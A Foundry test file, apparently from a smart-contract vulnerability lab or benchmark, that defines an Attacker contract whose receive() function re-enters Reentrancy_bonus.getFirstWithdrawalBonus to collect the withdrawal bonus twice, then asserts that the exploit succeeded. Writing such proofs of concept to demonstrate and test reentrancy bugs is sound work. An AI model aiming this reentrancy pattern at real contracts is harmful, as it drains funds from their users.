
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/Reentrancy_bonus.sol";

contract TestReentrancyReentrancy_bonus is Test {
    
    Reentrancy_bonus public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new Reentrancy_bonus();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal >= 200 && attackVal <= 100 ether);

        // --- 2. State Configuration (Pre-Condition) ---
        // No specific state setup required for this contract other than funding.

        // --- 3. Funding ---
        // A. Fund the Victim (so it has ETH to steal)
        vm.deal(address(_contractUnderTest), attackVal * 2); 
        
        // B. Fund the Attacker (redundancy)
        vm.deal(address(_attacker), attackVal * 2);

        // C. CRITICAL: Fund the Test Contract (address(this))
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    Reentrancy_bonus public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;

    constructor(address victimAddress) { 
        victim = Reentrancy_bonus(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State.
        initialSnapshot = address(this).balance;

        // 3. Call the vulnerable function.
        victim.getFirstWithdrawalBonus(address(this));

        // 4. Verify Success Conditions.
        // The bonus is 100 wei. If we re-entered once, we should have received 200 wei.
        if (address(this).balance > initialSnapshot + 100) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            victim.getFirstWithdrawalBonus(address(this));
        }
    }
}
